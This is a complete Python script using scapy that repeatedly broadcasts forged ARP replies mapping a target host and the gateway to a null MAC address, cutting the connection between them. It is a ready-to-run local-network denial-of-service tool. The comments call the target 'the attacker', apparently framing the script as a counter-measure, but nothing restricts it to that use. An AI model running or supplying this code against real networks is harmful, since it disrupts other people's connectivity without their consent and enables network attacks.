import sys
import time
from scapy.all import sendp, ARP, Ether

def poison(gateway_ip, target_ip, iface):
    poison_mac = "00:00:00:00:00:00"  # bogus MAC to break traffic

    print(f"Starting ARP poison between attacker {target_ip} and gateway {gateway_ip}. Press Ctrl+C to stop.")

    try:
        while True:
            # Poison the attacker (tell them the gateway has bogus MAC)
            pkt1 = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                op=2,
                psrc=gateway_ip,
                hwsrc=poison_mac,
                pdst=target_ip,
                hwdst="ff:ff:ff:ff:ff:ff"
            )

            # Poison the gateway (tell it the attacker has bogus MAC)
            pkt2 = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                op=2,
                psrc=target_ip,
                hwsrc=poison_mac,
                pdst=gateway_ip,
                hwdst="ff:ff:ff:ff:ff:ff"
            )

            sendp(pkt1, iface=iface, verbose=False)
            sendp(pkt2, iface=iface, verbose=False)
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nPoisoning stopped by user.")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python arp_poison_loop.py <target_ip> <gateway_ip> <interface>")
        sys.exit(1)

    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    iface = sys.argv[3]
    poison(gateway_ip, target_ip, iface)
